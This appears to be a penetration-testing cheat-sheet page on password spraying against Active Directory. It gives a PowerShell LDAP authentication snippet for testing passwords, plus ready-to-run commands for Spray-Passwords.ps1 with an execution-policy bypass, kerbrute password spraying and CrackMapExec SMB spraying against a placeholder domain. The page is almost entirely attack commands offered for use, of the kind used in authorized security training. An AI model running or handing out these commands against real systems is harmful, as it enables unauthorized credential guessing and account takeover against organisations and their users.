# Password Attacks

## Windows

Get account policy:

```powershell
net accounts
```

### Spray-Passwords.ps1

Authenticating using DirectoryEntry:

{% code overflow="wrap" %}
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
{% endcode %}

* If the password for the user account is <mark style="color:green;">correct</mark>, the object creation will be successful
* If the password is <mark style="color:red;">invalid</mark>, no object will be created and we will receive an exception

This can be used for password spraying: [**Spray-Passwords.ps1**](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)

```powershell
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

* -Pass: set password to test
* -Admin: test admin accounts

### Kerbrute

> cross platform tool

Using kerbrute to attack user accounts

{% code overflow="wrap" %}
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
{% endcode %}



## Linux

Password spraying attack on SMB using CrackMapExec

{% code overflow="wrap" %}
```shell
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
{% endcode %}

* (<mark style="color:red;">Pwn3d!</mark>) = admin user&#x20;

